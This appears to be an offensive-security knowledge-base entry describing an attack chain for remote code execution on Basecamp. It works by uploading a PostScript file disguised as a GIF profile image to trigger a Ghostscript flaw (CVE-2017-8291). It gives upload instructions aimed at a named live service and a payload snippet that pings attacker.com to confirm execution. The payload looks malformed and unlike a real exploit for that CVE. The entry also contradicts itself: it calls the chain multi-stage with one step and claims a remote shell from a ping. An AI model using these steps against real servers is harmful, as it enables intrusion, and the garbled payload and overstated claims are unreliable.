---
tags:
  - rce
  - file-upload
  - ghostscript
  - imagemagick
  - cve-2017-8291
type: attack_chain
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/GraphicsMagick]]'
  - '[[tools/Ghostscript]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Upload-Malicious-PostScript-as-Profile-Image]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:24:14.794Z'
description: >-
  Exploits a file upload vulnerability in Basecamp's profile image function to
  achieve remote code execution using a disguised PostScript file processed by
  vulnerable Ghostscript.
skill_level: intermediate
impact_level: high
id: 2cd20807-775d-47f0-90af-9a05b62247c0
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# RCE via Malicious PostScript Upload in Basecamp Profile Images

Multi-stage attack chain demonstrating a complete attack workflow exploiting a critical vulnerability in Basecamp's profile image upload to achieve remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via File Upload] --> B[Execution via Ghostscript]
    B --> C[Remote Shell Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Text editor for crafting PostScript payload
- Web browser for uploading to Basecamp

### Target Environment

- Basecamp web application
- Server using ImageMagick or GraphicsMagick with vulnerable Ghostscript (pre-CVE-2017-8291 patch)
- No specific ports required beyond standard HTTPS (443)

### Initial Access Requirements

- Valid Basecamp user account for profile image upload
- Network access to Basecamp.com
- No prior elevated access needed

## Detailed Attack Procedures

### Step 1: Upload Malicious PostScript File
procedure: [[procedures/Upload-Malicious-PostScript-as-Profile-Image]]

**Objective**: Disguise a malicious PostScript file as a GIF and upload it via the profile image function to trigger RCE through Ghostscript processing.

**Instructions**: Create a PostScript file with embedded shell commands exploiting CVE-2017-8291. Start with the '%!' header to invoke Ghostscript. Embed a proof-of-concept command like [[commands/ping-rce-poc]] to verify execution by pinging an attacker-controlled host. Rename the file to .gif (e.g., rce.gif) and upload it as the profile image in Basecamp's user settings.

The server will process the file using ImageMagick or GraphicsMagick, which invokes Ghostscript due to the PostScript header, executing the embedded commands.

```bash
# Example PostScript payload content (save as rce.ps, then rename to rce.gif)
%!PS
( /sh (ping -c1 attacker.com) ) | open
```

Upload via Basecamp's profile edit page.

**Expected Output**: Network traffic from the server to attacker.com (monitor with tcpdump or a listener on attacker.com), confirming RCE. Profile image may appear broken, but execution occurs server-side.

**Success Indicators**:
- Incoming ping request to attacker.com
- No upload rejection; file accepted despite invalid image
- Potential server logs showing Ghostscript invocation (if accessible)

## Attack Chain Summary

### Key Achievements

1. Bypassed file validation by renaming PostScript to .gif
2. Exploited CVE-2017-8291 in Ghostscript for arbitrary shell command execution
3. Gained remote shell access on the Basecamp server, enabling further exploitation like privilege escalation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
